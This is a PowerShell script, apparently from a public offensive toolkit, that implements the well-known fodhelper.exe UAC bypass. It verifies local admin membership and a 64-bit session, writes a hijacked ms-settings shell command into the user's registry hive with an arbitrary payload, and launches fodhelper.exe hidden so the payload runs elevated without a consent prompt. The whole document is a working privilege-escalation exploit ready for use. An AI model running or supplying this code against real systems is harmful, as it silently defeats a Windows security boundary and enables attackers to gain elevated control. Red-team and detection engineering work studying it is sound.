function Invoke-FodHelperUACBypass {
#.SYNOPSIS
# Simple FodHelper UAC Bypass
# ARBITRARY VERSION NUMBER:  1.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# Privilege esclation script developed to exploit the 'fodhelper.exe' UAC bypass,
# with moderate validation built in (e.g., session is 64-bit, current user is in
# the Local Administrators group).
# 
# Parameters:
#   -Payload  -->  Command to execute when 'fodhelper.exe' is executed.
#   -Help     -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory


    Param(
        [string]$Payload,
        [switch]$Help
    )


    # Return Get-Help Information
    if ($Help) { return (Get-Help Invoke-FodHelperUACBypass) }


    # Error Correction
    if (!$Payload) { return '[-] Missing payload to execute.' }


    # Validate User is in Local Administrators Group
    $CurrentUser       = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $isUserALocalAdmin = (Get-LocalGroupMember -Group 'Administrators' | ? { $_.Name -eq $CurrentUser })
    if (!($isUserALocalAdmin) ) { return '[-] User is not in the Local Administrators group.' }


    # Validate Session is 64-bit
    if (!([Environment]::Is64BitProcess)) { return '[-] Session is not 64-bit.' }


    # Validate 'FodHelper.exe' exists
    if (!(Test-Path -LiteralPath "C:\Windows\System32\fodhelper.exe")) { return ("[-] Cannot find 'fodhelper.exe'.") }


    # Create registry structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Payload -Force
 

    # Perform the UAC bypass
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
}